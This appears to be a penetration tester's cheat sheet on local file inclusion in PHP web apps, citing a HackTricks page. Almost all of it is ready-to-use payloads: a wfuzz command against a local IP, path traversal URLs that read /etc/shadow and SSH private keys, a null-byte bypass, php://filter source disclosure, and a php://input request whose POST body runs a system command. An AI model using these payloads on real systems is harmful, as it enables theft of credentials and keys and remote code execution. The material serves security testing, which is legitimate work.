---
description: https://book.hacktricks.xyz/pentesting-web/file-inclusion
---

# LFI

### Files

```
/etc/passwd
/etc/shadow
/etc/knockd.conf     // port knocking config
```

### LFI with Wfuzz

```
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt --hc 404 --hh 206 http://192.168.0.119/index.php?file=FUZZ
```

### Basic LFI

```
http://url/index.php?page=../../../etc/passwd
http://url/index.php?page=../../../etc/shadow
http://url/index.php?page=../../../home/user/.ssh/id_rsa.pub
http://url/index.php?page=../../../home/user/.ssh/id_rsa
http://url/index.php?page=../../../home/user/.ssh/authorized_keys
```

### **Null byte (%00)**

```
http://url/index.php?page=../../../etc/passwd%00
```

### php://filter

```
http://url/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://url/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

### input:// <a href="#wrapper-input" id="wrapper-input"></a>

```
http://url/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
